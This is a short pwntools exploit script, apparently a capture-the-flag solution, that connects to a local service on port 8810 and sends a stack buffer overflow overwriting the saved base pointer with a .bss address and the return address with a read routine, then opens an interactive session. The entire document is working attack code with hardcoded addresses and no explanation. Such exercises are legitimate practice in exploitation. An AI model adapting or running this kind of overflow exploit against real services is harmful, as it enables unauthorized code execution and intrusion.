from pwn import *
io=remote("localhost",8810)
bss=0x601230
read=0x000000000040082f
write=0x00000000004005f0
io.sendline("a"*80+p64(bss)+p64(read))
io.sendline("a"*100)
io.interactive()
